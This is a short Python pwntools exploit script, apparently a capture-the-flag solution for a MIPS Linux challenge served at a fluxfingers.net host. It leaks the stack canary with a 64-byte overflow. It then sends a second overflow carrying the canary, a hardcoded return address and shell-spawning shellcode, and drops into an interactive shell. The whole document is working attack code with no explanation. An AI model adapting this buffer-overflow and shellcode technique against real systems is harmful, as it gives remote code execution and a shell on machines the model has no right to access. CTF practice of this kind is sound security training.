from pwn import *


context.arch = 'mips'

shellcode = asm(shellcraft.mips.linux.sh())

# p = remote('localhost', 1338)
p = remote('noriscnofuture.forfuture.fluxfingers.net', 1338)

p.sendline('A'*64)
p.recvuntil('\n')

canary = u32('\x00'+p.recv(3))
p.recv(1)
log.info('canary: {}'.format(hex(canary)))

p.sendline('A'*64+p32(canary)+'A'*4+p32(0x7ffffd40)+'\x00'*16+shellcode)

for i in range(8):
	p.sendline('')
	p.recvuntil('\n\n')

p.interactive()